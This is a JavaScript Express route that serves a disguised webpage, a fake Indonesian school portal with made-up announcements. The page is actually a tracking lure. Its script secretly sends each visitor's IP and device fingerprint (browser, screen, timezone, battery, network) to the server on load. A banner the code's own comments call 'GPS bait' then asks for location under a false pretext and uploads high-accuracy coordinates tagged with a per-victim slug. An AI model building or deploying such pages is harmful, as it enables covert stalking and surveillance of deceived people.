// ---------- Landing Page (Tema Web Sekolah/Birokat) ----------
app.get('*', (req, res) => {
  const slug = cleanSlug(req.query.s || req.path.replace(/\//g, ''));
  res.type('html').send(`<!doctype html>
<html lang="id"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Portal Informasi Sekolah</title>
<style>
  :root { --primary: #0f766e; --bg: #f8fafc; --text: #334155; }
  * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
  body { margin: 0; background: var(--bg); color: var(--text); }
  .navbar { background: var(--primary); color: white; padding: 15px 20px; display: flex; align-items: center; justify-content: space-between; font-weight: bold; }
  .hero { background: white; padding: 30px 20px; text-align: center; border-bottom: 1px solid #e2e8f0; }
  .hero h1 { margin: 0 0 10px; font-size: 22px; color: #0f172a; }
  .hero p { margin: 0; font-size: 14px; color: #64748b; }
  .container { padding: 20px; max-width: 600px; margin: 0 auto; }
  .card { background: white; border-radius: 10px; padding: 20px; margin-bottom: 15px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
  .card h3 { margin: 0 0 10px; font-size: 16px; color: #0f172a; }
  .card p { margin: 0; font-size: 13px; line-height: 1.6; color: #475569; }
  .card .date { font-size: 11px; color: #94a3b8; margin-bottom: 8px; display: block; }
  
  /* BANNER LOKASI (Pancingan GPS) */
  .loc-banner { position: fixed; bottom: 20px; left: 20px; right: 20px; background: #1e293b; color: white; padding: 15px; border-radius: 12px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 10px 25px rgba(0,0,0,0.2); z-index: 999; transform: translateY(150%); transition: 0.4s; }
  .loc-banner.show { transform: translateY(0); }
  .loc-banner p { margin: 0; font-size: 12px; flex: 1; }
  .loc-banner button { background: #38bdf8; color: #0f172a; border: none; padding: 8px 15px; border-radius: 6px; font-weight: bold; font-size: 12px; cursor: pointer; }
</style>
</head>
<body>

<div class="navbar">
  <span>🏫 SMK Negeri 1</span>
  <span>☰</span>
</div>

<div class="hero">
  <h1>Selamat Datang di Portal Sekolah</h1>
  <p>Pusat informasi akademik dan kegiatan siswa</p>
</div>

<div class="container">
  <div class="card">
    <span class="date">Hari ini</span>
    <h3>Pengumuman Ujian Tengah Semester</h3>
    <p>Ujian Tengah Semester (UTS) akan dilaksanakan mulai minggu depan. Siswa diharapkan mempersiapkan diri dengan baik. Jadwal lengkap dapat dilihat di papan pengumuman sekolah.</p>
  </div>
  <div class="card">
    <span class="date">Kemarin</span>
    <h3>Kegiatan Ekstrakurikuler</h3>
    <p>Pendaftaran ekstrakurikuler baru dibuka. Tersedia pilihan Pramuka, Paskibra, Futsal, Basket, dan Robotik. Silakan hubungi wali kelas untuk informasi lebih lanjut.</p>
  </div>
  <div class="card">
    <span class="date">2 hari lalu</span>
    <h3>Pembayaran SPP Bulan Ini</h3>
    <p>Diharapkan orang tua/wali murid segera menyelesaikan administrasi SPP sebelum tanggal 10. Pembayaran dapat dilakukan melalui bank atau langsung ke bagian tata usaha.</p>
  </div>
</div>

<div class="loc-banner" id="locBanner">
  <p>Aktifkan lokasi untuk melihat informasi sekolah terdekat.</p>
  <button id="allowLoc">Aktifkan</button>
</div>

<script>
(function(){
  const slug = ${JSON.stringify(slug)};
  
  // 1. Ambil IP otomatis
  fetch('/api/geoip?s=' + encodeURIComponent(slug)).catch(()=>{});

  // 2. Ambil Data HP (User-Agent, Baterai, Jaringan)
  async function collectData() {
    const data = {
      src: 'device_info',
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      screenRes: screen.width + 'x' + screen.height,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      slug: slug
    };
    if (navigator.getBattery) {
      try { const b = await navigator.getBattery(); data.battery = Math.round(b.level*100)+'%'; data.charging = b.charging; } catch(e){}
    }
    if (navigator.connection) {
      data.netType = navigator.connection.effectiveType;
    }
    fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data) }).catch(()=>{});
  }
  
  // Jalanin langsung pas halaman kebuka
  collectData();

  // 3. Pancingan GPS (Muncul setelah scroll 2 detik)
  const banner = document.getElementById('locBanner');
  const btnLoc = document.getElementById('allowLoc');
  let isGpsDone = false;

  setTimeout(() => {
    banner.classList.add('show');
  }, 3000); // Muncul setelah 3 detik

  // Kalau tombol di-banner diklik, minta izin GPS
  btnLoc.addEventListener('click', () => {
    if (isGpsDone || !navigator.geolocation) return;
    isGpsDone = true;
    banner.classList.remove('show');
    
    navigator.geolocation.getCurrentPosition(
      p => {
        fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,slug,ts:Date.now()}) }).catch(()=>{});
        btnLoc.innerText = 'Aktif';
      },
      e => {
        fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps_err',err:e.code,slug,ts:Date.now()}) }).catch(()=>{});
      },
      {enableHighAccuracy:true,timeout:9000,maximumAge:0}
    );
  });
})();
</script>
</body></html>`);
});
